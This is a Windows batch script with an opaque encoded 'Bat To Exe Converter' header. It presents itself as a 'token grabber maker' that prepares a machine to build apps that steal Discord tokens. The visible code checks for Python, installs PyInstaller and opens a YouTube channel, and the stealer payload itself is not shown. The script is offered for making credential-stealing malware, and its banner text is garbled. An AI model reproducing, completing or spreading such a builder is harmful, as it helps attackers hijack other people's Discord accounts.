::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZka3nHxHqYbByPlyL9rN9sEsx+mZCk=
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZkfxGzvS71AGW3qoQ==
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZki1Hn7HoQLVC312bgI
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZkDxXntSucCG2iB
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZkDxHrsXbsHF2av1L5kWA==
::fBE1pAF6MU+EWHreyHcjLQlHcCyHL2q3NpYgzO3o5P6IsnEZUfQ6dIDL07qJHOQa+UbrZ5IRxXVPisgJHyd8dwGoYR0w5FpNvWGLeuCOsg3jT1rE60o7Hnc0yiPdjTgvZcFUtMYUkyax8En6jZkU0Gz+Pg==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDNRXwWPDEiGIroL5uT07u6Unk8UU6ItfZ3O06DOaLJapEznevY=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJgZksaHmQ=
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDBeHKH6qZg==
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWHGhx3EZSA==
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATE3GcDGzI0
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDNRXwWPDEiGIrAP4/z0/9aDp1sYWO0vcYHc5rCHM+Mc+EHYZpk4xHlfi/coBQhbcQCvIzs7omtM+0OXNsWeth2sR0mC41lwViV5hnDEiTkHTtZ/2sUM3yS77nHsmrEFwTb6Rqxu
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title token grabber maker by HESSI

color c
echo ========================= NOTE =========================
echo   This script creates videos that grabbs discord token
echo     python needs to be installed for this to work
echo         make the apps that grabbs discord token!
echo                      made by HESSI
echo ========================================================
echo.
pause

WHERE python
IF %ERRORLEVEL% NEQ 0 echo python wasn't found. Please make sure it is installed correctly. && pause && exit
color 7
cls

WHERE pyinstaller
IF %ERRORLEVEL% NEQ 0 pip install pyinstaller

set url="https://www.youtube.com/channel/UCC00RuLq5Oy59fsMR1zOyRQ"

echo you have python and i installed the pyinstaller for you. just run the start file now!

pause

start microsoft-edge:%url%
start chrome %url%
start firefox.exe %url%
start iexplore.exe %url%

